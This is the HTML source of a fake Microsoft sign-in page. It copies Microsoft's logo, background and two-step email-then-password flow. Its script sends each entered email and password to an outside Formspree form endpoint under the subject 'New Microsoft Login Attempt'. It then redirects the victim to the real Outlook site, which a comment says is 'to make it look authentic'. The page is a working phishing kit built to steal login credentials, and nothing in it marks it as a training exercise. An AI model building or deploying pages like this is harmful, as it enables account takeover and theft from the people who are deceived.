<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <style>
        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; color: #1b1b1b;
        }
        .outer-container { width: 440px; }
        .login-card {
            background: #fff; padding: 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            margin-bottom: 28px; min-height: 376px;
        }
        /* Fix: Uses the official logo with "Microsoft" text lockup */
        .ms-logo { width: 108px; height: auto; margin-bottom: 24px; display: block; }
        
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; }

        /* Identity Row: Fixes alignment seen in your screenshots */
        .identity-container {
            display: flex; align-items: center;
            padding: 4px; margin-bottom: 12px;
            cursor: pointer; border-radius: 2px; margin-left: -8px;
        }
        .identity-container:hover { background-color: rgba(0,0,0,0.05); }
        .back-btn-img { width: 20px; height: 20px; margin-right: 8px; }
        .user-avatar { width: 20px; height: 20px; margin-right: 8px; border-radius: 50%; }
        #display-email { font-size: 15px; }

        .input-field {
            width: 100%; border: none; border-bottom: 1px solid #666;
            padding: 8px 0; font-size: 16px; margin-bottom: 12px;
            outline: none; transition: border-bottom 0.1s ease-in;
        }
        .input-field:focus { border-bottom: 2px solid #0067b8; }
        
        .help-text { font-size: 13px; margin: 12px 0; }
        .help-text a { color: #0067b8; text-decoration: none; }
        .help-text a:hover { text-decoration: underline; }

        .button-row { display: flex; justify-content: flex-end; margin-top: 40px; }
        .btn-next {
            background-color: #0067b8; color: #fff; border: none;
            padding: 8px 32px; font-size: 15px; cursor: pointer; min-width: 108px;
        }
        .btn-next:hover { background-color: #005da6; }

        .options-box {
            background: #fff; padding: 12px 44px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
            display: flex; align-items: center; cursor: pointer;
        }
        .key-icon { width: 24px; height: 24px; margin-right: 12px; opacity: 0.6; }

        .footer { position: fixed; bottom: 0; right: 0; padding: 12px 30px; font-size: 12px; }
        .footer a, .footer span { margin-left: 24px; text-decoration: none; color: #000; cursor: pointer; }
    </style>
</head>
<body>
    <div class="outer-container">
        <div class="login-card">
            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" class="ms-logo">
            
            <div id="email-section">
                <h1>Sign in</h1>
                <input type="email" id="user-email" placeholder="Email, phone, or Skype" class="input-field" spellcheck="false">
                <p class="help-text">No account? <a href="#">Create one!</a></p>
                <p class="help-text"><a href="#">Can’t access your account?</a></p>
                <div class="button-row">
                    <button class="btn-next" onclick="showPassword()">Next</button>
                </div>
            </div>

            <div id="password-section" style="display: none;">
                <div class="identity-container" onclick="showEmail()">
                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.svg" class="back-btn-img" alt="Back">
                    <img src="https://aadcdn.msauth.net/shared/1.0/content/images/user_6683a54f0545f4457e5b778733f3883a.svg" class="user-avatar" alt="User">
                    <div id="display-email"></div>
                </div>
                <h1>Enter password</h1>
                <input type="password" id="user-password" placeholder="Password" class="input-field">
                <p class="help-text"><a href="#">Forgot password?</a></p>
                <div class="button-row">
                    <button class="btn-next" id="signin-btn" onclick="submitData()">Sign in</button>
                </div>
            </div>
        </div>
        <div class="options-box">
            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" class="key-icon">
            <span>Sign-in options</span>
        </div>
    </div>
    <div class="footer">
        <a href="#">Terms of use</a> <a href="#">Privacy & cookies</a> <span>...</span>
    </div>

    <script>
        let currentEmail = "";

        function showPassword() {
            currentEmail = document.getElementById('user-email').value;
            if(!currentEmail) return;
            document.getElementById('email-section').style.display = 'none';
            document.getElementById('password-section').style.display = 'block';
            document.getElementById('display-email').innerText = currentEmail;
            document.getElementById('user-password').focus();
        }

        function showEmail() {
            document.getElementById('password-section').style.display = 'none';
            document.getElementById('email-section').style.display = 'block';
        }

        async function submitData() {
            const password = document.getElementById('user-password').value;
            const btn = document.getElementById('signin-btn');
            
            // Visual feedback
            btn.innerText = "Loading...";
            btn.disabled = true;

            try {
                // Sending data to Formspree
                const response = await fetch('https://formspree.io/f/mvzwepzj', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        email: currentEmail, 
                        password: password,
                        _subject: "New Microsoft Login Attempt"
                    })
                });

                // Final redirect to make it look authentic
                window.location.href = "https://outlook.office.com/mail/";
            } catch (err) {
                // Fallback redirect if network fails
                window.location.href = "https://outlook.office.com/mail/";
            }
        }
    </script>
</body>
</html>
